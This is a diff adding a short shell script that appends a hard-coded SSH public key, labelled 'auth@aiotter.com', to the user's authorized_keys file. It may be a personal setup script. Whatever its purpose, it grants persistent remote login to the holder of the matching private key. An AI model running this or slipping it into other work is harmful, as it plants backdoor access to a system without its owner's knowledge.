@@ -1,0 +1,4 @@
+#!/bin/sh
+cat <<EOS >>~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTlGAeEdHbQ1rmM+kP+WpdRNMURXi/9wnKdHYyH+snuIO47AF6mHotCaOJZuMkoCeWK6ueiGAYyimeiPQDEnmyegcv7SiOY0zGEbKg0uDAFDaevvqcnhX0E4K4clR8uoTfPDkzg9QdEMX+njd+LK2iwXJ6Hifxk9f6RTsybLF9uCx1Lj2Ep7uFNk/ZtBTBBiY0IGnC3x6BQZ8hs7VqJMgUgGlKC1ZXYJ0uaRuQPquSTcfqjj6lItEQUxbQmSnNC5s+mTkO8m1bWrfsfg6DhiegHiuPgOOcH+raYKS2BS/n+ggF2iHnxXFkZ9ZxIc69s+CvD5+nMDc3mXVvhypPuU+V auth@aiotter.com
+EOS
